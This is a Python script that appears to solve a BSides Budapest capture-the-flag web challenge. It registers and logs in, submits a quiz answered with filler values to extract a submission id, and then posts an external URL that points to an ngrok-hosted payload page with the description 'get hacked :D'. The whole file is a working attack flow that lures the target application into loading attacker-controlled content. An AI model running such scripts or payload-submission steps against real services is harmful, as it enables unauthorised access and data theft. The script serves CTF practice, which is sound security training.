import requests
from urllib.parse import unquote_plus

username = "admin1337"
password = "13371337"  

URL = "https://exfiled.ctf.bsidesbud.com"
PAYLOAD_URL = "https://d0b2-2a02-ab88-1507-cb00-00-6716.ngrok-free.app/static/index.html"

#register user
s = requests.Session()
r = s.post(URL + "/api/register", data={"username": username, "password": password})
print(r.url)

# login
r = s.post(URL + "/api/login", data={"username": username, "password": password})
print(r.url)

# submit flag quiz
data = {
    "test_id": 2
}

for i in range(14, 213):
    data["q" + str(i)] = "0"

r = s.post(URL + "/api/student/submit-test", data)
print(r.url)

submission_id = unquote_plus(r.url).split(" ")[-1]

print("Got submission_id:", submission_id)

input("Are you ready?")

r = s.post(URL+"/api/student/submit-external", data={"url": PAYLOAD_URL, "description": "get hacked :D"})
print(r.url)